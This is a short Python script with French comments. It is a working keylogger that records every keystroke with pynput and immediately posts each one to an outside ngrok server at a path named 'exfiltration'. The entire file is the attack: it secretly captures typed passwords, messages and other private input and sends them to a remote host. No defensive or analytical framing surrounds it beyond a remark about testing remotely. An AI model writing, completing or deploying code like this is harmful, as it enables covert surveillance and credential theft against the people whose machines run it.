from pynput import keyboard
import requests

# L'URL du serveur Flask (assurez-vous que le serveur est en cours d'exécution)
SERVER_URL = "https://38ac1df687ae.ngrok-free.app/exfiltration"  # Utilise l'IP de ton serveur Flask si tu veux tester à distance

def on_press(key):
    try:
        # Capture de la touche appuyée
        char = key.char
    except AttributeError:
        # Si c'est une touche spéciale (espace, retour chariot, etc.)
        char = f" [{key}] "

    # Envoie la frappe à ton serveur Flask
    try:
        requests.post(SERVER_URL, data={"key": char})
    except Exception as e:
        print(f"Erreur lors de l'envoi au serveur : {e}")

# Démarre l'écoute des frappes clavier
listener = keyboard.Listener(on_press=on_press)
listener.start()

# Maintient le listener actif
listener.join()
